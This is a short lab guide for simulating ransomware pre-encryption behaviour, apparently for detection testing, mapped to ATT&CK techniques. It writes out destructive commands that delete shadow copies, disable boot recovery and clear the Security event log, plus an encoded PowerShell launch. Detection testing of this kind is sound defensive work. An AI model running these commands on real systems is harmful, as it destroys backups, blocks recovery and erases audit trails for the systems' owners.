# Attack simulation steps (LAB ONLY)

> ⚠️ **Warning**: these commands are **destructive** (they delete backups, disable recovery and erase logs).
> Run them **only** inside an isolated, disposable virtual lab with snapshots. Never on a real system.

No real ransomware was used. Each step reproduces one behaviour of the pre-encryption phase.

## Step 1: Encoded PowerShell (T1059.001)

```powershell
# Encode a harmless test command, then run it encoded
$cmd = 'Write-Host "TEST-SPLUNK-ENCODED"'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $enc
```

## Step 2: Shadow copy deletion (T1490)

```cmd
vssadmin delete shadows /all /quiet
```

## Step 3: Mass file activity on the file share (pre-encryption)

```cmd
for /L %i in (1,1,200) do echo test > \\10.0.0.11\TestRansom\file%i.txt
```

## Step 4: Disable recovery (T1490)

```cmd
bcdedit /set {default} recoveryenabled No
```

## Step 5: Clear the Security log (T1070.001)

```cmd
wevtutil cl Security
```

## After the test

Restore the VM snapshots to bring the lab back to a clean state.
